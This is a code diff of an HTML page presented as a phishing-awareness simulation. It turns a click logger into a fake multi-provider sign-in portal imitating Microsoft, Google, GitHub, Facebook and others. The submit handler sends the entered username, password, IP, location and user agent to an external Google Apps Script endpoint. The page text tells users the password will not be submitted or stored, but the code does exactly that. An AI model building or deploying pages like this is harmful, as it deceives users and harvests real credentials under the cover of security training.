@@ -1,79 +1,234 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Loading...</title>
-    <script>
-        (function() {
-            // --- Configuration ---
-            
-            // 1. YOUR FORMPSREE ENDPOINT
-            const FORM_ENDPOINT = "https://formspree.io/f/mldpylrb";
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Sign in to your account</title>
+  <style>
+    /* (your existing styling) */
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+      background-color: #f3f3f3;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      margin: 0;
+      padding: 20px;
+      box-sizing: border-box;
+    }
+    .portal-box {
+      background: #fff;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      padding: 30px 40px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+      width: 100%;
+      max-width: 420px;
+      text-align: center;
+    }
+    .portal-box h2 { margin-top:0; font-weight:600; color:#333; }
+    .sso-options { display:flex; flex-direction:column; gap:12px; margin-top:18px; }
+    .sso-button { display:flex; align-items:center; justify-content:center; padding:12px; border-radius:6px; border:1px solid #ccc; text-decoration:none; color:#333; font-weight:600; cursor:pointer; background:#fff; }
+    .sso-button img { width:22px; height:22px; margin-right:10px; }
+    #loginForm { display:none; margin-top:18px; text-align:left; }
+    .form-row { margin-bottom:12px; }
+    label { display:block; font-size:0.9rem; color:#333; margin-bottom:6px; }
+    input[type="text"], input[type="password"], input[type="email"] { width:100%; padding:10px; border-radius:6px; border:1px solid #ccc; box-sizing:border-box; }
+    .btn { display:inline-block; margin-top:8px; padding:10px 14px; border-radius:6px; background:#06b6d4; color:#042024; font-weight:700; border:none; cursor:pointer; }
+    #training-message { display:none; margin-top:18px; padding:14px; background:#fffbeb; border:1px solid #e0a800; border-radius:6px; color:#333; text-align:left; }
+    small.note { display:block; color:#666; margin-top:8px; font-size:0.85rem; }
+  </style>
 
-            // 2. YOUR TRAINING PAGE URL
-            const TRAINING_PAGE_URL = "https://cybersecurity-llc.github.io/cybersecurity-awareness.html";
+  <!-- Firebase SDKs are no longer needed -->
 
-            // --- End of Configuration ---
-
-            // This function runs immediately
-            async function logAndRedirect() {
-                
-                let geoData = {}; // Initialize an empty object
-
-                try {
-                    // 1. FIRST, try to fetch IP and Geolocation data
-                    const geoResponse = await fetch("https://ipapi.co/json/");
-                    geoData = await geoResponse.json();
-
-                } catch (geoError) {
-                    // If geo-lookup fails, log it and prepare default error data
-                    console.error("Geolocation fetch failed:", geoError);
-                    geoData = {
-                        ip: "Geo-Lookup Failed",
-                        city: "Geo-Lookup Failed",
-                        region: "Geo-Lookup Failed",
-                        country_name: "Geo-Lookup Failed",
-                        org: "Geo-Lookup Failed"
-                    };
-                }
-
-                try {
-                    // 2. SECOND, create a data object to send
-                    // This code will run whether the geo-lookup succeeded or failed
-                    const formData = new FormData();
-                    
-                    formData.append("phishing_click_event", "User clicked the link");
-                    formData.append("ip_address", geoData.ip);
-                    formData.append("city", geoData.city);
-                    formData.append("region", geoData.region);
-                    formData.append("country", geoData.country_name);
-                    formData.append("isp", geoData.org);
-                    formData.append("user_agent", navigator.userAgent); // Always captured
-
-                    // 3. THIRD, send all captured data to your Formspree endpoint
-                    await fetch(FORM_ENDPOINT, {
-                        method: 'POST',
-                        body: formData,
-                        headers: {
-                            'Accept': 'application/json'
-                        }
-                    });
-
-                } catch (formError) {
-                    // Log errors from Formspree, but redirect anyway
-                    console.error("Formspree submission failed:", formError);
-                } finally {
-                    // 4. FINALLY, always redirect the user
-                    // This ensures the user is redirected even if Formspree fails
-                    window.location.href = TRAINING_PAGE_URL;
-                }
-            }
-
-            // Run the function
-            logAndRedirect();
-        })();
-    </script>
 </head>
 <body>
-    <p>Loading, please wait...</p>
+  <div class="portal-box" role="main" aria-labelledby="title">
+    <h2 id="title">Sign in with</h2>
+
+    <!-- SSO options (HTML is unchanged) -->
+    <div class="sso-options" id="sso-selection">
+      
+      <a href="#" class="sso-button" data-provider="Microsoft">
+        <img alt="Microsoft" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyMyAyMyIgd2lkdGg9IjIzIiBoZWlnaHQ9IjIzIj48cGF0aCBmaWxsPSIjZjNmM2YzIiBkPSJNMCAwaDIzdjIzSDB6Ii8+PHBhdGggZmlsbD0iI2YzNTMyNSIgZD0iTTEgMWgxMHYxMEgxeiIvPjxwYXRoIGZpbGw9IiM4MWJjMDYiIGQ9Ik0xMiAxaDEwdjEwSDEyeiIvPjxwYXRoIGZpbGw9IiMwNWE2ZjAiIGQ9Ik0xIDEyaDEwdjEwSDF6Ii8+PHBhdGggZmlsbD0iI2ZmYmEwOCIgZD0iTTEyIDEyaDEwdjEwSDEyeiIvPjwvc3ZnPg=="/>
+        Sign in with Microsoft
+      </a>
+      
+      <a href="#" class="sso-button" data-provider="Google"><img alt="Google" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA0OCA0OCI+PHBhdGggZmlsbD0iI0ZCRUI1MyIgZD0iTTQzLjg4MiAyNGM2IDIuMTk2LS4zMjYgNC4zOTItMS4wNzEgNi4zMzZoLTE4LjQyVjE5LjY3aDkuODA5Yy0uODc0IDIuMzctMi4zNzEgNC4yMi00LjI4IDUuNTYybjAgMGwtLjA1Ni4zNDV2Ni44NTNsNi4yNTIgNC44NDZjMy4zMzYtMy4zNzIgNS44OTktOC4zMDEgNS44OTktMTMuOTYyIi8+PHBhdGggZmlsbD0iI0U1NDUzNSIgZD0iTTI4LjQ0OSA0My44NDdjLTQuMTM2IDIuODExLTkuMjAzIDQuNDk3LTE0LjYwNCA0LjQ5N0M1Ljc5MyA0OC4zNDQgMCA0Mi4wMzIgMCAzNC44NjEgMCAyOC4xNjkgNC44ODIgMjIuNDcgMTEuMzk4IDE5LjYzdi03LjAzaDcuMDM3di4wNTJjMy4xNDgtNS4wNDIgOC44MTYtOC4zODIgMTUuMjYxLTguMzgyaDkuMjg5djcuMDM3aC05LjI4OWMtNC4xMzYgMC03LjY3OCAyLjQ4OC05LjI4OSA2LjA5N2g5LjI4OXY3LjAzN2gtOS4yODljLS4zMjYgMC0uNjUyIDAtLjk3OS4wNTJ2LjAyN2gtLjAxYzAgLjA1SDEyLjk2MiAxMi45NjJ6TTE4LjQ3MSAzMy44MzlsLTYuMjUyLTQuODQ2Yy0xLjc5MyAxLjIwNi00LjA3OSAxLjE5NDQtNi43MzcgMS45NDRjLTUuMjg3IDAtOS43NTUtMy4zMDktMTEuMzgzLTcuODE4SDguMzQ3djcuMDM3YzIuODUgNi4yNTIgOC42MTYgMTAuNzE4IDE1LjU5MSAxMC43MThaIi8+PC9zdmc+"/>Sign in with Google</a>
+      <a href="#" class="sso-button" data-provider="LinkedIn"><img alt="LinkedIn" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iIzAwNzdiYiI+PHBhdGggZD0iTTIwLjQ0NyAyMC40NTJoLTMuNTUzdi01LjU2OWMwLTEuMzI4LS4wMjctMy4wMzctMS44NTItMy4wMzdzLTIuMTM2IDEuNDQ1LTIuMTM2IDIuOTM5djUuNjY3SDkuMzU1VjkuMGg0LjM0OXYxLjM2MWguMDYyYzEuMDMxLTEuNzM2IDIuNDk0LTMuNTUzIDQuMjg3LTMuNTUzIDQuNTgxIDAgNS40MjQgMy4wMTMgNS40MjQgNi45MjZ2Ny45NzV6TTUuMjIgNy41NmEwLjAxIDAuMDEgMCAwIDEtLjAyMS4wMDFoLS4wMjFjLTEuMjMgMC0yLjIyLTEtMi4yMi0yLjIyYTEuNjYgMS42NiAwIDAgMSAxLjY2LTEuNjZjMS4yMyAwIDIuMjIgMSAyLjIyIDIuMjJjMCAxLjIyLTEuMjMgMi4yMi0yLjIyIDIuMjJ6TTAuMDIgMjAuNDUyaDQuMzQ5VjkuMGgtNC4zNDlWMjAuNDUyeiIvPjwvc3ZnPg=="/>Sign in with LinkedIn</a>
+      <a href="#" class="sso-button" data-provider="GitHub"><img alt="GitHub" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZD0iTTEyIDBDNS4zNzMgMCAwIDUuMzczIDAgMTJjMCA1LjMwMyAzLjQzOCA5LjgwNSA4LjIwNSAxMS4zODUuNi4xMTMuODI4LS4yNTkuODI4LS41NzcgMC0uMjg1LS4wMS0xLjA0LS4wMTUtMi4wNC0zLjM0LjcyNS00LjA0LTEuNjEtNC4wNC0xLjYxLS41NDYtMS4zODUtMS4zMzUtMS43NTYtMS4zMzUtMS43NTYtMS4wOS0uNzQ0LjA4Mi0uNzI5LjA4Mi0uNzI5IDEuMjA1Ljg0IDEuODM4IDIuMDYyIDEuODM4IDIuMDYyIDEuMDcgMS44MzMgMi44MSAxLjMwMyAzLjQ5My45OTguMTEtLjc3Ni40MTgtMS4zMDMuNzYtMS42MDVDNy42NDUgMTguOTU1IDQuNTEgMTcuOTk0IDQuNTEgMTIuNzYyYzAtMS42MTIuNTc1LTIuOTI1IDEuNTA1LTMuOTU1LS4xNTUtLjc3Ni0uNjUyLTIuNTIuMTQ1LTMuOTAgMCAwIDEuMDE1LS4zMjUgMy4zMyAyLjAwN0EyMy4yNiAyMy4yNiAwIDAgMSAxMiA4LjA4NWMxLjAxNS4wMDMgMi4wMy4xMzYgMy4wMDQuNDA2IDIuMzE0LTIuMzMyIDMuMzI1LTIuMDA3IDMuMzI1LTIuMDA3Ljc5NyAxLjM4LTMgMy4xMjQtLjE0NSAzLjkuOTMgMS4wMyAxLjUwNSA5LjM0MyAxLjUwNSA5Ljk1NCAwIDUuMjQ0LTMuMTM1IDYuMTg1LTUuOTIgNi4yNTUuNDMuMzcxLjgyIDEuMS44MiAyLjIyNiAwIDEuNjA1LS4wMTUgMi45LS4wMTUgMy4yOTYgMCAuMzIxLjIyOC42OTQuODI4LjU3NkMyMC41NjUgMjEuODA1IDI0IDE3LjMwMyAyNCAxMmMwLTYuNjI3LTUuMzczLTEyLTEyLTEyeiIvPjwvc3ZnPg=="/>Sign in with GitHub</a>
+      <a href="#" class="sso-button" data-provider="X (Twitter)"><img alt="X" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZD0iTTE4LjkwMSAxLjE1MmgyLjI4bC03LjAyIDcuOTgzIDguMjY5IDEyLjgzN0gxNmwtNS43OC03LjU4NEwzLjY4NSAyMy4xNmgtMi4yOGw3LjM4OC04LjQ3OUwxLjMgMS4xNTJoNS4xODFsNS4wNjQgNi42MjZMMTguOTAxIDEuMTUyek0xNy4wMyA1BooleanA1Mi4xODVsLTIuMDQtMi4yNiA1LjQ4LTEuOTg0IDIuMDQgMi4yNnYyLjI2bDcuODQtMS43MiAxLjQtMi4xMDQtLjE4LS4yNi0xLjU4Ljk4LTkuNTYgMi4wNnoiLz48L3N2Zz4="/>Sign in with X</a>
+      <a href="#" class="sso-button" data-provider="Facebook">
+        <img alt="Facebook" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iIzE4NzdmMiI+PHBhdGggZD0iTTIyLjY3NSAwaC0yMS4zNWMtLjczMiAwLTEuMzI1LjU5My0xLjMyNSAxLjMyNXYyMS4zNWMwIC43My41OTMgMS4zMjUgMS4zMjUgMS4zMjVoMTEuNjkzdi05LjE5NmgtMy4xMjh2LTMuNjIySDEyLjk5OFY5LjU5NGMwLTMuMjI1IDIuMTYtNS4wMjIgNC45My01LjAyMmgzLjM5OXYzLjYyN2gtMi4wNDFjLTEuMjQxIDAtMS40ODUuNTkxLTEuNDg1IDEuNDU4djIuNTE2aDMuNzA1bC0uNDg3IDMuNjIySDE3Ljc5OXY5LjE5Nmg0Ljg3OGMuNzMyIDAgMS4zMjUtLjU5MyAxLjMyNS0xLjMyNXYtMjEuMzVjMC0uNzMyLS41OTMtMS4zMjUtMS4zMjUtMS4zMjV6Ii8+PC9zdmc+"/>
+        Sign in with Facebook
+      </a>
+      <a href="#" class="sso-button" data-provider="Instagram">
+        <img alt="Instagram" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSI+PGxpbmVhckdyYWRpZW50IGlkPSJncmFkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjMiIHgyPSIxOS41IiB5MT0iMjEuMDAxIiB5Mj0iNC41MDEiPjxzdG9wIG9mZnNldD0iMCIgc3RvcC1jb2xvcj0iI2Y2YzkzNyIvPjxzdG9wIG9mZnNldD0iLjMxIiBzdG9wLWNvbG9yPSIjZTU3NzA2Ii8+PHN2Z1Agb2Zmc2V0PSIuOTg5IiBzdG9wLWNvbG9yPSIjZDc0MjcyIi8+PC9saW5lYXJHcmFkaWVudD48cGF0aCBmaWxsPSJ1cmwoI2dyYWQpIiBkPSJNMTIgMEM4LjcyMSAwIDUuMjMyIDAgMS45NDEgMS45NDFDMCA1LjMyOSAwIDguNzIxIDAgMTJjMCAzLjI3OSAwIDYuNjcxIDEuOTQxIDguMDU5QzUuMjMyIDI0IDguNzIxIDI0IDEyIDI0YzMuMjc5IDAgNi42NzEtLjAwMSA4LjA1OS0xLjk0MUMyNCAyMC42NzEgMjQgMTcuMjc5IDI0IDEyYzAtMy4yNzkgMC02LjY3MS0xLjk0MS04LjA1OUMyMC42NzEgMCAxNy4yNzkgMCAxMiAwek05LjgwOSA1Ljg5NGMuNjQ4LS4wMDIgMS4zMTUtLjAwNCAxLjk5MS0uMDA0IDIuMDY3IDAgMy4yODIgMS4yIDEzLjMwOCAzLjM0OS4wMzEuNTk5LjAzIDEuMjAzLjAyNyAxLjgxLS4wMDQuNjA4LS4wMDYgMS4yMzItLjAwNiAxLjg1MS0uMDAyLjYxOS0uMDAyIDEuMjg4LS4wMDYgMS44ODgtLjAxNiAyLjM4NS0xLjM2MSA0LjA1Mi0zLjM4MSA0LjEzMi0uNTg5LjAyMS0xLjE4LjA0Mi0xLjc2OC4wNDItLjU5MyAwLTEuMTkyLS4wMjEtMS43ODItLjA0MmMtMi4xMzYtLjA4LTMuNzQ1LTEuNzU1LTMuODIxLTQuMDM3LS4wMzYtMS4xNzgtLjAzNi0yLjM2MS0uMDM2LTMuNTM4QzUuOTk5IDEwLjA5NSA2LjAwNSA3LjQ1IDkuODA5IDUuODk0em04LjAyMiA5LjI1MWMuNzc3LS4wOTMuOTIyLS4xNjYuOTIyLS45OTQtLjAwMi0uODQyLS4xMy0uOTk2LS44OTctMS4wMS0xLjA3LS4wMDgtMy4zNjQtLjAwOC00Ljg5NS0uMDA4LTEuNDQxIDAtMy42NTIgMC00Ljc0OS4wMDgtLjc5LjAwMi0uOTYyLjE3NC0uOTYyIDEuMDQtLjAwMS44OTkuMTkyIDEuMDQgMS4xIDEuMDRjMS4zODQtLjAwMyAzLjQyOS0uMDAzIDQuNzAzLS4wMDMuMzg2IDAgMS4yMjItLjAwNCAxLjc4LS4wMzd6bS01LjYyNC02LjM1MmE1Ljg0OSA1Ljg0OSAwIDAxLTUuNzggNS45MTNjLjAwNSAzLjI2IDEuOTA4IDUuNTg5IDUuNzggNS41ODlzNS43NzQtMi4xNzcgNS43NzQtNS41ODljLjAwNS0zLjI5My0yLjExMS01LjkxMy01Ljc3NC01LjkxM3ptLTUuMzgyIDUuODgzYzAgMi4xMzUuNjggMy44NjMgNS4zODIgMy44NjMgNC42NTIgMCA1LjM2NC0xLjcwMyA1LjM2NC0zLjgxNyAwLTIuMTM2LS43MS0zLjg2My01LjM2NC0zLjg2My00LjcwNSAwLTUuMzgyIDEuNjc4LTUuMzgyIDMuODE3ek01LjkyIDExLjEzYTMuMjc5IDMuMjc5IDAgMDAuMDAxLTEuMDI5Yy4zNzQtLjg2NyAxLjU0Mi0xLjMyIDMuMTMxLTEuMzIgMS4yOTcgMCAzLjAwOC4xMTYgMy42NDguOTk0QzEyLjA2MyA4Ljk3IDEwLjc0NSA5LjYwNCA5LjY0OCAxMC42MzdjLTEuMTU3IDEuMDgzLTEuNjQ0IDIuMDU4LTEuNjQ0IDMuOTM1cy41MSA0LjAxIDMuMDI4IDQuMDM3YzEuMDIxLjAxIDMuMTMyLjA0IDQuNTIuMDQzLjYyMyAwIDEuMjUuMDAyIDEuODgzLjAwNi44MjQuMDA1IDEuNDUzLS4wMDggMS45OTMtLjExMy0uNzYzLjg1My0xLjkxNyAxLjIyMy0zLjEzMSAxLjIyMy0yLjg5MSAwLTQuNjcyLTEuODIzLTQuNjcyLTMuNjQ4cy4xNjgtMi43NTkuMzk4LTMuNDkyek0xOC4xMDYgNy44NTdhMS4zMSAxLjMxIDAgMDAtMS4zMS0xLjMxYy0uNzIzIDAtMS4zMS41ODctMS4zMSAxLjMxIDAgLjcyMy41ODcgMS4zMSAxLjMxIDEuMzFzMS4zMS0uNTg3IDEuMzEtMS4zMXoiLz48L3N2Zz4="/>
+        Sign in with Instagram
+      </a>
+    </div>
+
+    <!-- Login form -->
+    <form id="loginForm" autocomplete="off" novalidate>
+      <h3 id="formTitle" style="margin:0 0 8px 0">Sign in</h3>
+      <div class="form-row">
+        <label for="username">Work email or username</label>
+        <input id="username" name="username" type="email" placeholder="you@company.com" required />
+        <small class="note">Please enter your work email to enroll in the training. We will never collect your password.</small>
+      </div>
+      <div class="form-row">
+        <label for="password">Password</label>
+        <input id="password" name="password" type="password" placeholder="Password (do not enter real password)" />
+        <small class="note">For this exercise, the password field is shown for realism but will <strong>not</strong> be submitted or stored. Do not enter any real credentials.</small>
+      </div>
+      <button type="submit" id="submitBtn" class="btn">Submit</button>
+      <button type="button" id="cancelBtn" class="btn" style="background:#e5e7eb;color:#0f1724;margin-left:8px;">Cancel</button>
+    </form>
+
+    <!-- Training message -->
+    <div id="training-message" role="status" aria-live="polite">
+      <h3>This Was a Security Test</h3>
+      <p>You were about to sign in on a simulated phishing page. We recorded that you attempted to authenticate via <strong id="providerNameDisplay"></strong>.</p>
+      <p>To improve your skills, please complete the short training that will open next.</p>
+      <p style="font-weight:bold;text-align:center;margin:0;">Redirecting to training…</p>
+    </div>
+  </div>
+
+  <script>
+    // Wait for the window to be fully loaded, including external scripts
+    window.onload = () => {
+    
+      /***********************
+       * Configuration
+       ***********************/
+      
+      // 1. PASTE YOUR GOOGLE SCRIPT URL HERE
+      const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbz6LMQheNygxd5ejseXkqSTfWs1_K90Ug9uXPdLG3BBPlcIhUUbR8RuG8XadUN965WAUw/exec";
+
+      const FINAL_ENROLLMENT_URL = "https://cybersecurity-llc.github.io/cybersecurity-awareness.html";
+      const REDIRECT_DELAY = 3000; // milliseconds
+
+      // Firebase is no longer needed
+      let db = null; 
+
+      /***********************
+       * Helper: fetch geo/ip safely
+       ***********************/
+      async function fetchGeo() {
+        try {
+          const res = await fetch('https://ipapi.co/json/');
+          if (!res.ok) throw new Error('geo failed');
+          return await res.json();
+        } catch (e) {
+          return {
+            ip: 'lookup_failed',
+            city: 'lookup_failed',
+            region: 'lookup_failed',
+            country_name: 'lookup_failed',
+            org: 'lookup_failed'
+          };
+        }
+      }
+
+      /***********************
+       * NEW Helper: send to Google Script
+       ***********************/
+      async function sendToGoogleScript(payloadObj) {
+        if (SCRIPT_URL === "PASTE_YOUR_WEB_APP_URL_HERE") {
+            console.error("SCRIPT_URL is not set. Data not sent.");
+            return;
+        }
+
+        try {
+          // We must send the data as a JSON string in the body
+          const response = await fetch(SCRIPT_URL, {
+            method: 'POST',
+            mode: 'cors', // Required for cross-origin requests
+            credentials: 'omit',
+            headers: {
+              'Content-Type': 'text/plain;charset=utf-8', // Use text/plain to avoid preflight
+            },
+            body: JSON.stringify(payloadObj)
+          });
+          
+          const result = await response.json();
+          console.log("Data sent to Google Script:", result);
+
+        } catch (err) {
+          console.error('Google Script error. Check CORS or script URL.', err);
+        }
+      }
+
+      /***********************
+       * Main flow (Modified)
+       ***********************/
+      const ssoButtons = document.querySelectorAll('.sso-button');
+      const ssoSelection = document.getElementById('sso-selection');
+      const loginForm = document.getElementById('loginForm');
+      const formTitle = document.getElementById('formTitle');
+      const providerDisplay = document.getElementById('providerNameDisplay');
+      const trainingMessage = document.getElementById('training-message');
+      const usernameInput = document.getElementById('username');
+      const passwordInput = document.getElementById('password');
+      let currentProvider = null;
+
+      ssoButtons.forEach(btn => {
+        btn.addEventListener('click', async (e) => {
+          e.preventDefault();
+          currentProvider = btn.dataset.provider || 'Unknown';
+          ssoSelection.style.display = 'none';
+          loginForm.style.display = 'block';
+          formTitle.textContent = `Sign in with ${currentProvider}`;
+          providerDisplay.textContent = currentProvider;
+          usernameInput.focus();
+        });
+      });
+
+      document.getElementById('cancelBtn').addEventListener('click', () => {
+        loginForm.style.display = 'none';
+        ssoSelection.style.display = 'flex';
+        usernameInput.value = '';
+        passwordInput.value = '';
+      });
+
+      loginForm.addEventListener('submit', async (ev) => {
+        ev.preventDefault();
+        const username = usernameInput.value ? usernameInput.value.trim() : '';
+        const password = passwordInput.value ? passwordInput.value.trim() : ''; 
+
+        const geo = await fetchGeo();
+
+        const payload = {
+          sso_attempt_provider: currentProvider,
+          username: username || '[no username provided]',
+          password: password || '[no password provided]',
+          ip_address: geo.ip,
+          city: geo.city,
+          region: geo.region,
+          country: geo.country_name,
+          isp: geo.org,
+          user_agent: navigator.userAgent
+        };
+
+        // *** THIS IS THE CHANGED LINE ***
+        // send to GOOGLE SCRIPT in background
+        sendToGoogleScript(payload).catch(() => { /* swallow errors */ });
+
+        // Show the training message & redirect
+        loginForm.style.display = 'none';
+        trainingMessage.style.display = 'block';
+        providerDisplay.textContent = currentProvider;
+
+        setTimeout(() => {
+          const url = new URL(FINAL_ENROLLMENT_URL);
+          if (username) url.searchParams.set('username', username);
+          window.location.href = url.toString();
+        }, REDIRECT_DELAY);
+      });
+
+    }; // End of window.onload
+  </script>
 </body>
 </html>
+
